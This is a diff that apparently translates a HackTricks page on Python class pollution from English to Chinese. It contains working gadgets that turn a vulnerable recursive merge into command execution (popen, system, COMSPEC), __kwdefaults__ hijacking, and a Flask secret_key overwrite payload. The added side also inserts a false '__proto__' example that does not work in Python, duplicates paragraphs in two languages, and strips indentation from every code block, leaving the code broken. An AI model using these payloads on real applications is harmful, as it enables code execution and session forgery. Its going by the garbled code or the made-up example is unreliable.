@@ -1,21 +1,20 @@
-# Class Pollution (Python's Prototype Pollution)
+# 类污染（Python的原型污染）
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获得[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)，或者**关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**
 
 </details>
 
-## Basic Example
+## 基本示例
 
-Check how is possible to pollute classes of objects with strings:
-
+查看如何使用字符串污染对象的类：
 ```python
 class Company: pass
 class Developer(Company): pass
@@ -39,9 +38,53 @@ e.__class__.__base__.__base__.__qualname__ = 'Polluted_Company'
 print(d) #<__main__.Polluted_Developer object at 0x1041d2b80>
 print(c) #<__main__.Polluted_Company object at 0x1043a72b0>
 ```
+## 基本漏洞示例
 
-## Basic Vulnerability Example
+Consider the following Python code:
 
+考虑以下Python代码：
+
+```python
+class Person:
+    def __init__(self, name):
+        self.name = name
+
+    def greet(self):
+        print(f"Hello, my name is {self.name}.")
+
+person = Person("Alice")
+person.greet()
+```
+
+This code defines a `Person` class with a constructor that takes a `name` parameter and a `greet` method that prints a greeting message with the person's name.
+
+这段代码定义了一个`Person`类，它有一个构造函数接受一个`name`参数和一个`greet`方法，该方法打印一个带有人名的问候消息。
+
+Now, let's say an attacker can control the `name` parameter passed to the `Person` constructor. They could potentially exploit this code by passing a malicious value that pollutes the `Person` class prototype.
+
+现在，假设攻击者可以控制传递给`Person`构造函数的`name`参数。他们可以通过传递一个恶意值来潜在地利用这段代码，污染`Person`类的原型。
+
+```python
+person = Person("__proto__")
+person.greet()
+```
+
+By passing the value `"__proto__"` as the `name` parameter, the attacker can pollute the `Person` class prototype with additional properties or methods.
+
+通过将值`"__proto__"`作为`name`参数传递，攻击者可以向`Person`类的原型中添加额外的属性或方法。
+
+```python
+person.__proto__.evil_method = lambda: print("Evil method executed!")
+person.evil_method()
+```
+
+In this example, the attacker adds an `evil_method` to the `Person` class prototype and executes it.
+
+在这个示例中，攻击者向`Person`类的原型中添加了一个`evil_method`并执行了它。
+
+This is a basic example of class pollution, a vulnerability that can lead to unexpected behavior or even remote code execution in more complex scenarios.
+
+这是一个类污染的基本示例，这种漏洞可能会导致意外行为甚至在更复杂的情况下远程代码执行。
 ```python
 # Initial state
 class Employee: pass
@@ -50,37 +93,35 @@ print(vars(emp)) #{}
 
 # Vulenrable function
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 
 USER_INPUT = {
-    "name":"Ahemd",
-    "age": 23,
-    "manager":{
-        "name":"Sarah"
-    }
+"name":"Ahemd",
+"age": 23,
+"manager":{
+"name":"Sarah"
+}
 }
 
 merge(USER_INPUT, emp)
 print(vars(emp)) #{'name': 'Ahemd', 'age': 23, 'manager': {'name': 'Sarah'}}
 ```
-
-## Gadget Examples
+## 示例代码
 
 <details>
 
-<summary>Creating class property default value to RCE (subprocess)</summary>
-
+<summary>创建类属性默认值以实现远程命令执行（subprocess）</summary>
 ```python
 from os import popen
 class Employee: pass # Creating an empty class
@@ -88,31 +129,31 @@ class HR(Employee): pass # Class inherits from Employee class
 class Recruiter(HR): pass # Class inherits from HR class
 
 class SystemAdmin(Employee): # Class inherits from Employee class
-    def execute_command(self):
-        command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
-        return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'
+def execute_command(self):
+command = self.custom_command if hasattr(self, 'custom_command') else 'echo Hello there'
+return f'[!] Executing: "{command}", output: "{popen(command).read().strip()}"'
 
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 USER_INPUT = {
-    "__class__":{
-        "__base__":{
-            "__base__":{
-                "custom_command": "whoami"
-            }
-        }
-    }
+"__class__":{
+"__base__":{
+"__base__":{
+"custom_command": "whoami"
+}
+}
+}
 }
 
 recruiter_emp = Recruiter()
@@ -127,30 +168,28 @@ merge(USER_INPUT, recruiter_emp)
 print(system_admin_emp.execute_command())
 #> [!] Executing: "whoami", output: "abdulrah33m"
 ```
-
 </details>
 
 <details>
 
-<summary>Polluting other classes and global vars through <code>globals</code></summary>
-
+<summary>通过<code>globals</code>污染其他类和全局变量</summary>
 ```python
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 class User:
-    def __init__(self):
-        pass
+def __init__(self):
+pass
 
 class NotAccessibleClass: pass
 
@@ -161,32 +200,30 @@ merge({'__class__':{'__init__':{'__globals__':{'not_accessible_variable':'Pollut
 print(not_accessible_variable) #> Polluted variable
 print(NotAccessibleClass) #> <class '__main__.PollutedClass'>
 ```
-
 </details>
 
 <details>
 
-<summary>Arbitrary subprocess execution</summary>
-
+<summary>任意子进程执行</summary>
 ```python
 import subprocess, json
 
 class Employee:
-    def __init__(self):
-        pass
+def __init__(self):
+pass
 
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 # Overwrite env var "COMSPEC" to execute a calc
 USER_INPUT = json.loads('{"__init__":{"__globals__":{"subprocess":{"os":{"environ":{"COMSPEC":"cmd /c calc"}}}}}}') # attacker-controlled value
@@ -195,39 +232,37 @@ merge(USER_INPUT, Employee())
 
 subprocess.Popen('whoami', shell=True) # Calc.exe will pop up
 ```
-
 </details>
 
 <details>
 
-<summary>Overwritting <strong><code>__kwdefaults__</code></strong></summary>
+<summary>覆盖 <strong><code>__kwdefaults__</code></strong></summary>
 
-**`__kwdefaults__`** is a special attribute of all functions, based on Python [documentation](https://docs.python.org/3/library/inspect.html), it is a “mapping of any default values for **keyword-only** parameters”. Polluting this attribute allows us to control the default values of keyword-only parameters of a function, these are the function’s parameters that come after \* or \*args.
-
+**`__kwdefaults__`** 是所有函数的特殊属性，根据 Python [文档](https://docs.python.org/3/library/inspect.html) ，它是一个“映射，用于存储**仅限关键字**参数的默认值”。污染这个属性可以让我们控制函数的仅限关键字参数的默认值，这些参数是在 \* 或 \*args 之后的函数参数。
 ```python
 from os import system
 import json
 
 def merge(src, dst):
-    # Recursive merge function
-    for k, v in src.items():
-        if hasattr(dst, '__getitem__'):
-            if dst.get(k) and type(v) == dict:
-                merge(v, dst.get(k))
-            else:
-                dst[k] = v
-        elif hasattr(dst, k) and type(v) == dict:
-            merge(v, getattr(dst, k))
-        else:
-            setattr(dst, k, v)
+# Recursive merge function
+for k, v in src.items():
+if hasattr(dst, '__getitem__'):
+if dst.get(k) and type(v) == dict:
+merge(v, dst.get(k))
+else:
+dst[k] = v
+elif hasattr(dst, k) and type(v) == dict:
+merge(v, getattr(dst, k))
+else:
+setattr(dst, k, v)
 
 class Employee:
-    def __init__(self):
-        pass
+def __init__(self):
+pass
 
 def execute(*, command='whoami'):
-    print(f'Executing {command}')
-    system(command)
+print(f'Executing {command}')
+system(command)
 
 print(execute.__kwdefaults__) #> {'command': 'whoami'}
 execute() #> Executing whoami
@@ -240,24 +275,21 @@ print(execute.__kwdefaults__) #> {'command': 'echo Polluted'}
 execute() #> Executing echo Polluted
 #> Polluted
 ```
-
 </details>
 
 <details>
 
-<summary>Overwriting Flask secret across files</summary>
+<summary>覆盖Flask应用程序中的密钥</summary>
 
-So, if you can do a class pollution over an object defined in the main python file of the web but **whose class is defined in a different file** than the main one. Because in order to access \_\_globals\_\_ in the previous payloads you need to access the class of the object or methods of the class, you will be able to **access the globals in that file, but not in the main one**. \
-Therefore, you **won't be able to access the Flask app global object** that defined the **secret key** in the main page:
-
+因此，如果您可以对在Web的主要Python文件中定义的对象进行类污染，但**其类在与主要文件不同的文件中定义**。因为在之前的有效载荷中，要访问\_\_globals\_\_，您需要访问对象的类或类的方法，您将能够**访问该文件中的全局变量，但无法访问主文件中的全局变量**。 \
+因此，您**无法访问在主页中定义了密钥的Flask应用程序全局对象**：
 ```python
 app = Flask(__name__, template_folder='templates')
 app.secret_key = '(:secret:)'
 ```
+在这种情况下，您需要一个工具来遍历文件，以获取到主文件，以便**访问全局对象 `app.secret_key`**，从而更改Flask的密钥，并能够[**利用此密钥升级权限**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)。
 
-In this scenario you need a gadget to traverse files to get to the main one to **access the global object `app.secret_key`** to change the Flask secret key and be able to [**escalate privileges** knowing this key](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign).
-
-A payload like this one [from this writeup](https://ctftime.org/writeup/36082):
+像这个[来自这篇文章](https://ctftime.org/writeup/36082)中的负载一样：
 
 {% code overflow="wrap" %}
 ```python
@@ -265,17 +297,17 @@ __init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.se
 ```
 {% endcode %}
 
-Use this payload to **change `app.secret_key`** (the name in your app might be different) to be able to sign new and more privileges flask cookies.
+使用此负载来**更改`app.secret_key`**（您的应用程序中的名称可能不同），以便能够签署新的和更高权限的flask cookie。
 
 </details>
 
-Check also the following page for more read only gadgets:
+还可以查看以下页面以获取更多只读小工具：
 
 {% content-ref url="python-internal-read-gadgets.md" %}
 [python-internal-read-gadgets.md](python-internal-read-gadgets.md)
 {% endcontent-ref %}
 
-## References
+## 参考资料
 
 * [https://blog.abdulrah33m.com/prototype-pollution-in-python/](https://blog.abdulrah33m.com/prototype-pollution-in-python/)
 
@@ -283,10 +315,10 @@ Check also the following page for more read only gadgets:
 
 <summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* 您在**网络安全公司**工作吗？您想在HackTricks中看到您的**公司广告**吗？或者您想要访问**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
+* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
+* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
+* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f)或[**电报群组**](https://t.me/peass)或在**Twitter**上**关注**我[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
+* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享您的黑客技巧。**
 
 </details>
